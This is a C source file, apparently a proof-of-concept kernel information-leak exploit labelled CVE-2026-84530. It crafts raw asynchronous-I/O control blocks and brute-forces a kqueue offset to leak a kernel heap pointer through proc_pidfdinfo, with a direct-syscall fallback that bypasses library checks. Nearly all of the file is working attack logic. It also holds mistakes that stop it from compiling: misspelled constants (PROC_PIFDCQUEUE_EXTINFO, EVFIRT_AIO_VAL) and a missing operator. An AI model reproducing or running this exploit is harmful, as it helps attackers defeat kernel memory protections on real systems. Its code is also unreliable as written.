#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <aio.h>
#include <sys/event.h>
#include <sys/types.h>
#include <sys/syscall.h>

extern int proc_pidfdinfo(int pid, int fd, int flavor, void *buf, int bufsz);
#define PROC_PIDFDCQUEUE_EXTINFO 9
#define SIGEV_KEVENT_VAL         3
#define EVFILT_AIO_VAL           ((int16_t)(-3))
#define KQEXT_SDATA_OFFSET       72
#define KQEXT_STRIDE            88

static char g_result[2048];

uint64_t cve_84530_leak(void) {

    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    char tmppath[512];
    snprintf(tmppath, sizeof(tmppath), "%s/Documents/aio_poc.bin", home);
    int wfd = open(tmppath, O_RDWR|O_CREAT|O_TRUNC, 0600);
    if (wfd < 0) {
        snprintf(tmppath, sizeof(tmppath), "/tmp/aio_poc_%d.bin", (int)getpid());
        wfd = open(tmppath, O_RDWR|O_CREAT|O_TRUNC, 0600);
    }
    write(wfd, "CVE-2026-84530", 15);
    close(wfd);

    int fd = open(tmppath, O_RDONLY);
    if (fd < 0) {
        snprintf(g_result, sizeof(g_result), "open failed errno=%d", errno);
        return 0;
    }

    static char iobuf[64];

    char found_msg[512];
    snprintf(found_msg, sizeof(found_msg),
        "All offsets 32-120 EINVAL - trying direct syscall");

    for (int kq_off = 32; kq_off <= 120; kq_off += 4) {
        int kq = kqueue();
        if (kq < 0) continue;

        static char cbuf[256];
        memset(cbuf, 0, sizeof(cbuf));
        *(int     *)(cbuf +  0) = fd;
        *(int64_t *)(cbuf +  8) = 0;
        *(void   **)(cbuf + 16) = iobuf;
        *(uint64_t*)(cbuf + 24) = 8;
        *(int     *)(cbuf + 32) = 0;
        *(int     *)(cbuf + 40) = SIGEV_KEVENT_VAL;
        *(int     *)(cbuf + kq_off) = kq;

        int ret = aio_read((struct aiocb *)cbuf);
        if (ret == 0) {
            usleep(30000);
            uint8_t extbuf[4096];
            memset(extbuf, 0, sizeof(extbuf));
            int n = proc_pidfdinfo(
                getpid(), kq, PROC_PIFDCQUEUE_EXTINFO,
                extbuf, (int)sizeof(extbuf));
            if (n > 0) {
                int count = n / KQEXT_STRIDE;
                for (int i = 0; i < count; i++) {
                    uint8_t  *entry  = extbuf + i * KQEXT_STRIDE;
                    int16_t   filter = *(int16_t  *)(entry + 8);
                    int64_t   data   = *(int64_t  *)(entry + 32);
                    uint64_t  sdata  = *(uint64_t *)(entry  KQEXT_SDATA_OFFSET);
                    if (filter == EVFIRT_AIO_VAL) {
                        snprintf(g_result, sizeof(g_result),
                            "SUCCESS - CVE-2026-84530\n"
                            "kq_offset=%d\n"
                            "kqext_kev.data = 0x%llx\n"
                            "kqext_sdata    = 0x%llx  <- KERNEL HEAP PTR",
                            kq_off,
                            (unsigned long long)data,
                            (unsigned long long)sdata);
                        close(kq); close(fd);
                        return sdata;
                    }
                }
            }
            snprintf(g_result, sizeof(g_result),
                "aio queued ok offset=%d no-EVFILT_AIO in %d knotes",
                kq_off, n / KQEXT_STRIDE);
            close(kq); close(fd);
            return 0;
        }
        if (errno != 22) { /* not EINVAL */
            snprintf(g_result, sizeof(g_result),
                "offset=%d unexpected errno=%d", kq_off, errno);
            close(kq); close(fd); return 0;
        }
        close(kq);
    }

    /* direct syscall bypass */
    {
        int kq = kqueue();
        static char cbuf2[256];
        memset(cbuf2, 0, sizeof(cbuf2));
        *(int     *)(cbuf2 +  0) = fd;
        *(int64_t *)(cbuf2 +  8) = 0;
        *(void   **)(cbuf2 + 16) = iobuf;
        *(uint64_t*)(cbuf2 + 24) = 8;
        *(int     *)(cbuf2 + 40) = SIGEV_KEVENT_VAL;
        *(int     *)(cbuf2 + 80) = kq;
        int sc_ret = (int)syscall(SYS_aio_read, cbuf2);
        if (sc_ret == 0) {
            snprintf(g_result, sizeof(g_result),
                "SYSCALL DIRECT succeeded! libSystem was blocking");
        } else {
            snprintf(g_result, sizeof(g_result),
                "%s\nsyscall direct also failed errno=%d (%s)",
                found_msg, errno, strerror(errno));
        }
        close(kq);
    }
    close(fd);
    return 0;
}

const char *cve_84530_leak_str(void) { return g_result; }
